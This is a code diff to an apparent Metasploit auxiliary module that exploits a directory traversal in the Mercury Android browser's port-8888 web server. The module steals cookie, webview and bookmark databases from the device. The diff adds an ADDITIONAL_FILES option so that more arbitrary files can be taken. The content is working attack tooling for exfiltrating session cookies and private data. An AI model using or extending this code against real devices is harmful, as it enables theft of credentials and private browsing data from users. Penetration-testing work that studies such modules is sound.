@@ -19,6 +19,10 @@ class Metasploit3 < Msf::Auxiliary
         private wifi manager activity, which starts a web server for Mercury on port 8888.
         The webserver also suffers a directory traversal that allows remote access to
         sensitive files.
+
+        By default, this module will go after webviewCookiesChromium.db, webviewCookiesChromiumPrivate.db,
+        webview.db, and bookmarks.db. But if this isn't enough, you can also specify the
+        ADDITIONAL_FILES datastore option to collect more files.
       },
       'Author'         =>
         [
@@ -34,7 +38,10 @@ class Metasploit3 < Msf::Auxiliary
         ]
     ))
 
-
+    register_options(
+      [
+        OptString.new('ADDITIONAL_FILES', [false, 'Additional files to steal from the device'])
+      ], self.class)
   end
 
   def is_android?(user_agent)
@@ -98,12 +105,18 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def file_urls
-    [
+    files = [
       '/data/data/com.ilegendsoft.mercury/databases/webviewCookiesChromium.db',
       '/data/data/com.ilegendsoft.mercury/databases/webviewCookiesChromiumPrivate.db',
       '/data/data/com.ilegendsoft.mercury/databases/webview.db',
       '/data/data/com.ilegendsoft.mercury/databases/bookmarks.db'
     ]
+
+    if datastore['ADDITIONAL_FILES']
+      files.concat(datastore['ADDITIONAL_FILES'].split)
+    end
+
+    files
   end
 
   def on_request_uri(cli, req)
